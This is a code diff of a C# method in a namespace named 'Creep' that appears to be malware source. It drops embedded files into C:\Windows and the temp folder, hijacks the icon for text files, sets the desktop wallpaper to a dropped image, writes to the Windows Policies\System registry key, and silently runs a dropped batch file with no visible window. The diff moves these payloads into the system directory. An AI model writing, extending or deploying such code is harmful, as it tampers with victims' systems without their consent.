@@ -48,16 +48,16 @@ namespace Creep
         public void WorkWorkWorkWork()
         {
             string temp = System.IO.Path.GetTempPath();
-            System.IO.File.WriteAllBytes(temp + "icon.ico", Properties.Resources.texticon);
+            System.IO.File.WriteAllBytes(@"C:\Windows\" + "icon.ico", Properties.Resources.texticon);
 
             RegistryKey editKey;
             
             editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
-            editKey.SetValue("", temp + "icon.ico");
+            editKey.SetValue("", @"C:\Windows\" + "icon.ico");
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
-            editKey.SetValue("Wallpaper", "");
+            editKey.SetValue("Wallpaper", @"C:\Windows\ht.jpg");
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
@@ -71,6 +71,7 @@ namespace Creep
             System.IO.File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
             System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
             System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
+            System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);
 
             ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
             psi.CreateNoWindow = true;
